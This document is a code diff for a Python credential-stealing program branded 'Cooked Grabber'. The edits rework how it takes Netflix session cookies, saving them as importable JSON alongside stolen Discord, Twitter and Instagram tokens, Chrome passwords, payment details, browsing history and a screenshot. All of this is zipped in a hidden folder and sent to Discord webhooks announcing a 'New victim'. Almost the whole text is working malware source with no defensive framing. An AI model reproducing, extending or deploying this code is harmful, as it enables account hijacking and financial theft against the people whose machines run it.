@@ -1,5 +1,5 @@
 import os, sys, win32con, browser_cookie3
-from json import loads
+from json import loads, dumps
 from base64 import b64decode
 from sqlite3 import connect
 from shutil import copyfile
@@ -195,7 +195,9 @@ def main(dirpath):
                     if search(r"NetflixId", y) != None:
                         data = y.split(' ')[1].split("=")[1]
                         if len(data) > 80:
-                            n_lst.append(data)
+                            n_lst.append([])
+                            for y in c:
+                                n_lst[-1].append({'domain': f"{website[3]}", "name": f"{y.split(' ')[1].split('=')[0]}", "value": f"{y.split(' ')[1].split('=')[1]}"})
     all_data_p = []
     for x in tokens:
         lst_b = has_payment_methods(x)
@@ -211,8 +213,7 @@ def main(dirpath):
                         all_data_p.append(writable_2)
         except:
             pass
-
-    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p, chrome_psw_list, list(set(n_lst))]
+    return [tokens, list(set(t_lst)), list(set(tuple(element) for element in insta_lst)), all_data_p, chrome_psw_list, n_lst]
 
 def send_webhook(DISCORD_WEBHOOK_URLs):
     p_lst = get_Personal_data()
@@ -221,7 +222,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
         SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
         get_screenshot(path=td)
         main_info = main(td)
-        discord_T, twitter_T, insta_T, chrome_Psw_t, net_T = (PrettyTable(padding_width=1) for _ in range(5))
+        discord_T, twitter_T, insta_T, chrome_Psw_t = (PrettyTable(padding_width=1) for _ in range(4))
         discord_T.field_names, twitter_T.field_names, insta_T.field_names, chrome_Psw_t.field_names, verified_tokens = ["Discord Tokens", "Username", "Email", "Phone"], ["Twitter Tokens [auth_token]"], ["ds_user_id", "sessionid"], ['Username / Email', 'password', 'website'], []
         for __t in main_info[4]:
             chrome_Psw_t.add_row(__t)
@@ -237,8 +238,6 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             twitter_T.add_row([_t])
         for _t_ in main_info[2]:
             insta_T.add_row(_t_)
-        for t__ in main_info[5]:
-            net_T.add_column(f"NetflixId ({main_info[5].index(t__)})", [t__])
         pay_l = []
         for _p in main_info[3]:
             if _p[1] == 1:
@@ -251,28 +250,32 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                 payment_p.field_names = ["Email", "Type", "Billing Adress"]
                 payment_p.add_row([_p[0], "Paypal", _p[2]])
                 pay_l.append(payment_p.get_string())
-        files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [os.path.join(td, "Instagram Tokens.txt"), insta_T], [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t], [os.path.join(td, "Netflix Tokens.html"), net_T]]
+        files_names = [[os.path.join(td, "Discord Tokens.txt"), discord_T], [os.path.join(td, "Twitter Tokens.txt"), twitter_T], [os.path.join(td, "Instagram Tokens.txt"), insta_T], [os.path.join(td, "Chrome Pass.txt"), chrome_Psw_t]]
         for x_, y_ in files_names:
-            if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0) or (y_ == files_names[3][1] and len(main_info[4])!=0) or (y_ == files_names[4][1] and len(main_info[5])!=0):
+            if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0) or (y_ == files_names[3][1] and len(main_info[4])!=0):
                 with open(x_, 'w') as wr:
-                    if files_names[4][1] != y_:
-                        wr.write(y_.get_string())
-                    else:
-                        net_T.format = True
-                        wr.write(y_.get_html_string())
+                    wr.write(y_.get_string())
+        all_files = [os.path.join(td, 'History.txt'), get_screenshot.scrn_path, os.path.join(td, "Payment Info.txt")]
+        for n in main_info[5]:
+            p = os.path.join(td, f'netflix_{main_info[5].index(n)}.json')
+            with open(p, 'w') as f:
+                f.write(dumps(n, indent=4))
+            all_files.append(p)
+        with open(all_files[0], 'w') as f:
+            f.write(find_His())
         with ZipFile(os.path.join(td, 'data.zip'), mode='w', compression=ZIP_DEFLATED) as zip:
             if ('payment_card' or 'payment_p') in locals():
-                with open(os.path.join(td, "Payment Info.txt"), 'w') as f:
+                with open(all_files[2], 'w') as f:
                     for i in pay_l:
                         f.write(f"{i}\n")
-                    zip.write(f.name)
-            with open(os.path.join(td, 'History.txt'), 'w') as f:
-                f.write(find_His())
-                zip.write(f.name)
-            with open(get_screenshot.scrn_path, "rb") as f:
-                zip.write(f.name)
+            for files_path in all_files:
+                try:
+                    zip.write(files_path)
+                except FileNotFoundError:
+                    pass
             for name_f, _ in files_names:
-                zip.write(name_f)
+                if os.path.exists(name_f):
+                    zip.write(name_f)
         for URL in DISCORD_WEBHOOK_URLs:
             webhook = DiscordWebhook(url=URL, username='Cooked Grabber', avatar_url="https://i.postimg.cc/FRdZ5DJV/discord-avatar-128-ABF2-E.png")
             embed = DiscordEmbed(title='New victim !', color='FFA500')
